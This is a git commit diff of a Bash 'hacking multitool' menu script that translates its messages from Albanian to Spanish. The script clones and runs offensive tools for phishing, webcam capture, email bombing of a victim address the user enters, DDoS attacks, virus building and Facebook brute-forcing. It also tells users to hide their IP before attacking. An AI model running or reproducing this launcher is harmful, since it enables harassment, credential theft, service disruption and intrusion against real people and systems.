ec483e38b25b7139ca59b5d2d8eb79bfe86b796e
ModInTheTop <baachirii51@gmail.com>
2026-07-09 10:37:09 +0200

    Update language and installation messages in Mod.sh

--- Mod.sh
+++ Mod.sh
@@ -2,30 +2,39 @@ clear
 mkdir Tools
 clear 
 echo -e '\033[31;40;1m 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
-⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
-⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
-⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀El Camino De Dios Es Perfecto
-⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
-⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀⠀⠀⠀
-⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
-⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡴⡛⠒⠠⡈⢷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢸⡿⠵⢲⡤⢢⣤⣽⢿⡖⡚⠻⢲⢤⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣠⢊⠖⠀⠀⡖⢉⡠⠳⡝⢟⠛⠛⡂⢹⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢰⢋⢰⣏⠀⠈⠋⠉⠀⠀⡟⢂⠈⠆⢸⣼⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⢟⣼⠈⢢⠁⢄⠀⠀⠀⢡⡎⣆⠠⠈⣿⡁⠀⠀⠀⣀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠰⣿⣧⡈⠮⠜⠀⠀⢀⣼⣿⣏⢒⣢⣿⡝⠶⠯⠝⢃⡜⠀⠀        MultiTools Para Hacking                            
+⠀⠀⡀⠀⠀⡀⠴⠝⡈⢻⣶⣄⣀⣴⡿⠊⢿⣽⣷⣭⣷⣬⡷⢖⡒⠋⠁⠀⠀      ⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+⠀⠀⠉⠒⡒⠂⢀⠠⠂⢠⠿⣸⡷⢾⡇⠀⢸⢡⣉⣒⡊⠉⠲⣀⢪⣑⢤⡀⠀  \033[33;4mVersion:\033[0m 1.0
+⠚⠯⡵⣮⡄⡀⡁⠔⣺⠈⠏⠀⠁⠫⡂⠀⠀⠑⢄⠀⠀⢢⢠⠿⡌⣿⣧⡇⠀   \033[33;4mCTRL+C:\033[0m Exit
+                ༻︶✷︶༺                          
+            𝐌𝐚𝐝𝐞 𝐁𝐲: 𝐁𝐚𝐚𝐜𝐡𝐢𝐫𝐢𝐢
+                ༻︵✷︵༺
+⠀⠀⠀⠉⠀⠀⢀⠴⡑⢇⠈⡄⠀⠀⠇⠀⠂⠀⠀⠑⢦⡟⠀⠊⣀⢯⡿⠁⠀
+⠀⠀⠀⠐⠶⢬⣶⡯⠈⡸⠀⠘⠄⠀⣿⠀⠀⠢⣄⠀⠀⠑⣦⡁⠁⢏⠀⠀⠀ 
+⠀⠀⠀⠘⢤⣄⠀⠄⠊⢠⡇⠀⠈⢄⠸⡖⣆⣤⣈⠳⣠⡺⠉⢹⡄⣿⠀⠀⠀
+⠀⠀⠀⠀⠀⡍⣍⠉⠁⣔⣿⠀⠀⠀⢀⢳⠀⠉⠙⠿⣿⠊⠀⢸⠯⠊⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠕⡭⠄⡣⡾⣇⠀⠀⠀⡌⣇⠀⠀⣠⡃⣤⠴⠋⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠙⢦⡀⠀⠰⡇⠉⠉⢁⡼⠸⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡎⠉⠒⠤⠃⡘⢠⠊⠆⠀⢃⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⡤⢞⡉⠉⠉⠁⠀⠀⠠⠊⣔⡁⠀⠈⠄⠈⡄⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣰⠏⠀⠀⠹⡄⠀⠀⠀⠀⠀⠈⣼⡇⠀⠀⠈⠄⠰⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⢩⢢⠀⠀⠀⠀⢠⣿⡇⠀⠀⠀⠈⢄⠆⠀⠀⠀⠀
+⠀⠀⠀⠀⡟⡇⠀⠀⠀⠀⠀⠆⠣⠄⢀⢀⢂⣿⡇⠀⠀⠀⠀⠀⠪⠍⣁⣂⠈
+⠀⠀⠀⠸⡇⠃⠀⠀⠀⠀⠀⡇⠀⢁⠔⠁⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀
+⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⡏⠉⠀⠀⠀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⣘⡿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⢀⠔⣼⡹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠡⠁⠀⠀⠀⠀⠀
 ⠀
-  જ⁀➴ Coded by Baachirii♡‧₊˚
-
-  
-\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m Baachirii‧₊˚
-
-\e[37m[1]\e[36m Kërkesat & Përditësimi        \e[37m[2]\e[36m Phishing Tool				
+\e[37m[1]\e[36m Requisitos y actualización        \e[37m[2]\e[36m Phishing Tool				
 \e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan			
-\e[37m[5]\e[36m Gmail Bomber		  \e[37m[6]\e[36m DDOS Attack			
-\e[37m[7]\e[36m Si të përdorni ?	          \e[37m[8]\e[36m Çinstaloni programet e shkarkuara		
+\e[37m[5]\e[36m Gmail Bomber		       \e[37m[6]\e[36m DDOS Attack			
 \e[37m[9]\e[36m Ip Info	                  \e[37m[10]\e[36m dorks-eye
 \e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
 \e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
@@ -35,14 +44,14 @@ echo -e '\033[31;40;1m
 '
 
 
-#Zgjedhja e Opsionit
+# Selección de opciones
 
 
 read -p "Numri i transaksionit: " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
 clear
 
-echo -e "\033[47;31;5m Po instalon përditësimin dhe kërkesat...\033[0m"
+echo -e "\033[47;31;5m Está instalando actualizaciones y solicitudes...\033[0m"
 sleep 5
 pkg install git -y
 pkg install python python3 -y
@@ -51,13 +60,13 @@ pkg install curl -y
 apt update
 apt upgrade -y
 clear
-echo -e "\033[47;3;35m Përditësimi i plotë...\033[0m"
+echo -e "\033[47;3;35m Actualización completa...\033[0m"
 sleep 3
 bash alhack.sh
 
 elif [[ $islem == 2 || $islem == 02 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/htr-tech/zphisher
@@ -66,7 +75,7 @@ bash zphisher.sh
 
 elif [[ $islem == 3 || $islem == 03 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/techchipnet/CamPhish
@@ -75,7 +84,7 @@ bash camphish.sh
 
 elif [[ $islem == 4 || $islem == 04 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 git clone https://github.com/zidansec/subscan
 cd subscan
@@ -84,7 +93,7 @@ read -p "Jepni nje domain p.sh (example.com): " sc
        
 elif [[ $islem == 5 || $islem == 05 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/juzeon/fast-mail-bomber.git
@@ -92,47 +101,31 @@ cd fast-mail-bomber/
 mv config.example.php config.php
 php index.php update-providers
 rm -rf data/nodes.json data/dead_providers.json
-echo -e "\033[47;3;35m Ky instalim do tju marre shum kohe\033[0m"
-echo -e "\033[47;3;35m Per te ndaluar shtypni Ctrl+C\033[0m"
+echo -e "\033[47;3;35m Esta instalación te llevará mucho tiempo\033[0m"
+echo -e "\033[47;3;35m [ Para detenerlo presióna Ctrl+C ]\033[0m"
 sleep 4
 php index.php update-nodes
 php index.php refine-nodes
 echo "-------------------------"
-read -p "Jepni nje adres emaili per te bombarduar: " mail
+read -p "Dar una dirección de correo electrónico para bombardear: " mail
 echo "-------------------------"
 php index.php start-bombing $mail
 
 elif [[ $islem == 6 || $islem == 06 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/palahsu/DDoS-Ripper.git
 cd DDoS-Ripper
 python3 DRipper.py
 echo ""
-echo -e "\033[47;3;35m Para se ta perdorni fshihni ip-n tuaj\033[0m"
+echo -e "\033[47;3;35m Antes de usarlo usa una VPN !!TU IP AHORA MISMO ES VISIBLE!!\033[0m"
 
-elif [[ $islem == 7 || $islem == 07 ]]; then
-clear
-echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
-python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
-sleep 10
-echo "Prisni 10 sekonda"
-bash alhack.sh
-
- 
-elif [[ $islem == 8 || $islem == 08 ]]; then
-clear
-echo -e "\033[47;3;35m PO HIQEN PROGRAMET E SHKARKUARA...\033[0m"
-sleep 3 
-rm -rf Tools
-
-bash alhack.sh
 
 elif [[ $islem == 9 || $islem == 09 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 apt update
@@ -143,7 +136,7 @@ bash trackip
 
 elif [[ $islem == 10 || $islem == 010 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/BullsEye0/dorks-eye.git
@@ -153,7 +146,7 @@ python3 dorks-eye.py
 
 elif [[ $islem == 11 || $islem == 011 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 apt update && apt upgrade && apt install git && apt install python2
@@ -164,7 +157,7 @@ python2 hackerpro.py
 
 elif [[ $islem == 12 || $islem == 012 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/Tuhinshubhra/RED_HAWK
@@ -173,7 +166,7 @@ php rhawk.php
 
 elif [[ $islem == 13 || $islem == 013 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/Devil-Tigers/TigerVirus
@@ -185,7 +178,7 @@ bash app.sh
 
 elif [[ $islem == 14 || $islem == 014 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo...\033[0m"
 sleep 3
 cd Tools
 pkg install curl -y
@@ -197,7 +190,7 @@ bash info.sh
 
 elif [[ $islem == 15 || $islem == 015 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo\033[0m"
 sleep 3
 cd Tools
 sudo apt-get update
@@ -211,7 +204,7 @@ sudo php BadMod.php
 
 elif [[ $islem == 16 || $islem == 016 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35mLa instalación puede llevar algún tiempo\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/fu8uk1/facebash
@@ -223,7 +216,7 @@ sudo ./facebash.sh
 
 elif [[ $islem == 17 || $islem == 017 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo\033[0m"
 sleep 3
 cd Tools
 pkg install git
@@ -237,22 +230,22 @@ python2 darkarmy.py
 
 elif [[ $islem == 18 || $islem == 018 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
-echo -e "\033[47;3;35m Ky tool do tju kerkoje te jeni (ROOT)\033[0m"
+echo -e "\033[47;3;35m La instalación puede llevar algún tiempo\033[0m"
+echo -e "\033[47;3;35m Esta herramienta te pedirá que uses Terminal (ROOT)\033[0m"
 sleep 3
 cd Tools
 sudo apt-get install tor
 pip3 install requests
 git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
 cd Auto_Tor_IP_changer
-echo -e "\033[47;3;35m shkoni te shfletuesi juaj / ndryshoni përfaqësuesin (sock proxy) në 127.0.0.1:9050\033[0m"
+echo -e "\033[47;3;35m Vaya a su navegador / cambie el representante (sock proxy) en 127.0.0.1:9050\033[0m"
 sleep 8
 python3 install.py
 aut
 
 else   
 	clear
-        echo -e '\033[36;40;1m Keni futur kodin e gabuar'	
+        echo -e '\033[36;40;1m Ingresaste el código incorrecto'	
 	sleep 1
 	clear 
 	bash alhack.sh
